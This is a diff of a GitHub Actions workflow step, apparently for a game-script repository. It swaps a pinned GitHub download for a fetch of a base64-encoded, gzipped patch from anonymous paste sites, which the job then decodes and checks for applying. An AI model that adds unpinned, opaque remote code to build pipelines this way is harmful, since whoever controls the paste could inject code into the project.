@@ -19,12 +19,13 @@ jobs:
         with:
           fetch-depth: 0
 
-      - name: Extract and apply patch
+      - name: Download and apply patch
         shell: bash
         run: |
           set -euo pipefail
-          curl -fsSL "https://raw.githubusercontent.com/tanhoangviet/Slap-Battles-Script/1b172c5896e33c2d27f95c897854f6f2a18936e1/.github/workflows/materialize-executor-icons.yml" -o /tmp/source.yml
-          sed -n "/<<'PATCH'/,/^PATCH$/p" /tmp/source.yml | sed '1d;$d' > /tmp/slap_patch.gz.b64
+          if ! curl -fsSL "https://paste.rs/LSePo" -o /tmp/slap_patch.gz.b64; then
+            curl -fsSL "https://paste.c-net.org/RussianClifton" -o /tmp/slap_patch.gz.b64
+          fi
           test -s /tmp/slap_patch.gz.b64
           base64 -d /tmp/slap_patch.gz.b64 | gzip -d > /tmp/slap_patch.diff
           git apply --check /tmp/slap_patch.diff
